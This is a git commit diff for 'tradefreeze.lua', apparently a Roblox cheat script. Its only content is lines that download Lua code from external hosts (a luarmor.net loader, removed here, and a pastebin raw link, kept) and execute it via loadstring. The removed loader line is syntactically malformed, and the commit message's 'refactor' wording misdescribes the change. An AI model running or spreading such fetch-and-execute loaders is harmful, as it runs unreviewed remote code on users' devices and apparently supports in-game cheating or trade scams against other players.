8e1a317a298fa6d3a194cee53d3268c6ddc5d386
bestsabscripts <masapara190@gmail.com>
2026-03-25 14:20:34 +0200

    Refactor tradefreeze.lua to simplify task spawning
    Removed redundant task.spawn function call.

--- tradefreeze.lua
+++ tradefreeze.lua
@@ -1,7 +1,3 @@
 task.spawn(function()
-  loadstring(game:HttpGet("loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()"))()
-end)
-
-task.spawn(function()
   loadstring(game:HttpGet("https://pastebin.com/raw/3fdp4kap"))()
 end)
